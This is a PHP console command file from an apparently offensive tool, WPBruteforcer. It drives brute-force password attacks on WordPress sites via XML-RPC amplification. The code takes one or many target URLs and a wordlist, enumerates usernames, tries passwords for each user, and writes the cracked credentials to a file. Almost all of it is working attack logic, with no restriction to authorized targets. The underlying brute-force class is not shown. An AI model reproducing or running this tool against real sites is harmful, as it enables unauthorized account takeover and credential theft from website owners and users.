<?php

namespace Arall\WPBruteforcer\Commands;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Arall\WPBruteforcer\WPBruteforcer;

class Main extends Command
{
    public function configure()
    {
        $this
            ->setName('bruteforce')
            ->setDescription('Bruteforce XMLRPC using amplification')
            ->addOption(
                'url',
                null,
                InputOption::VALUE_REQUIRED,
                'Website url (http://www.wordpress.org/)'
            )
            ->addOption(
               'urls',
               null,
               InputOption::VALUE_REQUIRED,
               'Websites list path (to bruteforce multiple targets)'
            )
            ->addOption(
               'wordlist',
               null,
               InputOption::VALUE_REQUIRED,
               'Wordlist path'
            )
            ->addOption(
               'tries',
               null,
               InputOption::VALUE_REQUIRED,
               'Nº of tries per request (100 as default)'
            )
            ->addOption(
               'username',
               null,
               InputOption::VALUE_REQUIRED,
               'Username to bruteforce (enumerate & bruteforce as default)'
            )
            ->addOption(
               'no-enum',
               null,
               InputOption::VALUE_NONE,
               'Don\'t enumerate users (requires --username flag)'
            )
            ->addOption(
               'no-test',
               null,
               InputOption::VALUE_NONE,
               'Don\'t test XMLRPC'
            )
            ->addOption(
               'max-enum',
               null,
               InputOption::VALUE_REQUIRED,
               'Limit for username enumeration (unlimited as default)'
            )
            ->addOption(
               'uri',
               null,
               InputOption::VALUE_REQUIRED,
               'XMLRPC URI (/xmlrpc.php as default)'
            )
            ->addOption(
               'output',
               null,
               InputOption::VALUE_REQUIRED,
               'Save the obtained credentials to a txt file'
            )
        ;
    }

    public function execute(InputInterface $input, OutputInterface $output)
    {
        $url = $input->getOption('url');
        $urls = $input->getOption('urls');
        $wordlist = $input->getOption('wordlist');
        $tries = $input->getOption('tries');
        $username = $input->getOption('username');
        $noenum = $input->getOption('no-enum');
        $notest = $input->getOption('no-test');
        $max_enum = $input->getOption('max-enum');
        $uri = $input->getOption('uri');
        $output_path = $input->getOption('output');
        $output_data = '';

        $bruteforcer = new WPBruteforcer();

        // Wordlist
        if (!file_exists($wordlist)) {
            $output->writeln('<error> [!] Wordlist file not found. Exiting...</error>');

            return;
        }
        $bruteforcer->setWordlist($wordlist);

        // Targets
        if ($url) {
            $urls = [$url];
        } elseif ($urls) {
            // Check wordlist
            if (!file_exists($urls)) {
                $output->writeln('<error> [!] URLs file not found. Exiting...</error>');

                return;
            }
            $urls = file($urls);
        }
        if (empty($urls)) {
            $output->writeln('<error> [!] No targets found. Exiting...</error>');

            return;
        }

        // Tries
        if ($tries) {
            $bruteforcer->setTries($tries);
        }

        // URI
        if ($uri) {
            $bruteforcer->setXmlrpcUri($uri);
        }

        foreach ($urls as $url) {
            $url = trim($url);

            $bruteforcer->setUrl($url);

            // Output current target
            $output->writeln('');
            $output->writeln(' [+] Target: <comment>' . $url . '</comment>');

            // Test XMLRPC
            if (!$notest) {
                $output->writeln(' [+] Testing XMLRPC...');
                if (!$bruteforcer->testXMLRPC()) {
                    $output->writeln('<error> [!] XMLRPC is not responding properly. Exiting...</error>');

                    continue;
                }
                $output->writeln('<info> [+] XMLRPC up and running!</info>');
            }

            // Usernames
            $users = [];
            if (!$noenum) {
                $output->writeln(' [+] Enumerating users...');
                $users = $bruteforcer->enumerate($max_enum);
                $output->writeln(' [+] <comment>' . count($users) . '</comment> user(s) found');
            }
            if ($username) {
                $users[] = $username;
            }
            $users = array_unique($users);
            if (empty($users)) {
                $output->writeln('<error> [!] No users to bruteforce. Exiting...</error>');

                continue;
            }

            // Bruteforce
            foreach ($users as $user) {
                $output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
                if ($password = $bruteforcer->bruteforce($user)) {
                    $output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
                    $output_data .= $url . ' | ' . $user . ' | ' . $password . PHP_EOL;
                } else {
                    $output->writeln('<error> [!] Password not found</error>');
                }
            }
        }

        if ($output_path) {
            file_put_contents($output_path, $output_data);
            $output->writeln('');
            $output->writeln(' [+] Credentials saved in <comment>' . $output_path . '</comment>');
        }
    }
}
